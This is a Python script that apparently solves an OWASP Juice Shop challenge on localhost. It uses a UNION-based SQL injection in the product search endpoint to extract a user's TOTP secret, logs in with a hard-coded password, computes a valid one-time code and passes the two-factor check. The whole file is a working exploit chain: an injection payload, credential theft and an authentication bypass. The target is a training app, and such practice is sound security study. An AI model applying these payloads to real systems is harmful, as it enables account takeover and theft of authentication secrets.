
import requests
import json
import logging
import base64
import struct
import hmac
import hashlib
import time

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

SERVER = 'http://localhost:3000'

def get_totp_token(secret):
    """
    Generate TOTP token from secret (Base32 string).
    """
    try:
        # Pad secret if needed
        padding = len(secret) % 8
        if padding != 0:
            secret += '=' * (8 - padding)
            
        key = base64.b32decode(secret, casefold=True)
        msg = struct.pack(">Q", int(time.time()) // 30)
        h = hmac.new(key, msg, hashlib.sha1).digest()
        o = h[19] & 15
        h = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 1000000
        return str(h).zfill(6)
    except Exception as e:
        logger.error(f"Error generating TOTP: {e}")
        return None

def solve_wurstbrot_2fa():
    # 1. Get TOTP Secret via SQL Injection
    logger.info("Attempting to retrieve TOTP secret via SQL Injection...")
    
    # Injection to put totpSecret into the 'image' field (column 6)
    injection = "nonexistent')) UNION SELECT id,'2','3',email,password,totpSecret,'7','8','9' FROM Users WHERE email='wurstbrot@juice-sh.op'-- "
    
    params = {'q': injection}
    try:
        res = requests.get(f'{SERVER}/rest/products/search', params=params)
        if not res.ok:
            logger.error(f"SQLi Request failed: {res.status_code}")
            return
            
        data = res.json().get('data', [])
        logger.info(f"SQLi returned {len(data)} rows.")
        
        totp_secret = None
        for item in data:
            # We look for the row where email (price param) is 'wurstbrot@juice-sh.op'
            if item.get('price') == 'wurstbrot@juice-sh.op':
                totp_secret = item.get('image')
                break
        
        if not totp_secret:
            logger.error("Could not find totpSecret in the response.")
            return
            
        logger.info(f"Found TOTP Secret: {totp_secret}")
        
        # 2. Login to get tmpToken
        logger.info("Logging in as wurstbrot...")
        creds = {
            "email": "wurstbrot@juice-sh.op",
            "password": "EinBelegtesBrotMitSchinkenSCHINKEN!"
        }
        
        s = requests.Session()
        login_res = s.post(f'{SERVER}/rest/user/login', json=creds)
        
        tmp_token = None
        # Juice Shop returns 401 for "Password valid, need TOTP"
        if login_res.status_code == 200 or login_res.status_code == 401:
            try:
                login_data = login_res.json()
                if login_data.get('status') == 'totp_token_required':
                    tmp_token = login_data.get('data', {}).get('tmpToken')
                    logger.info(f"Login successful (stage 1). Got tmpToken: {tmp_token[:20]}...")
                elif 'authentication' in login_data:
                    logger.info("Login successful directly (2FA not active?).")
                    return
                else:
                    logger.error(f"Unexpected login response: {login_data}")
                    return
            except Exception:
                logger.error(f"Failed to parse login response: {login_res.text}")
                return
        else:
             logger.error(f"Login failed: {login_res.status_code} {login_res.text}")
             return

        # 3. Generate TOTP
        current_token = get_totp_token(totp_secret)
        logger.info(f"Generated TOTP Token: {current_token}")
        
        # 4. Verify TOTP
        logger.info("Verifying TOTP...")
        verify_payload = {
            "totpToken": current_token,
            "tmpToken": tmp_token
        }
        
        verify_res = s.post(f'{SERVER}/rest/2fa/verify', json=verify_payload)
        
        if verify_res.ok:
            logger.info("SUCCESS! 2FA Verified.")
            logger.info(verify_res.json())
        else:
            logger.error(f"2FA Verification Failed: {verify_res.status_code} {verify_res.text}")
            
    except Exception as e:
        logger.exception(f"Exception: {e}")

if __name__ == '__main__':
    solve_wurstbrot_2fa()
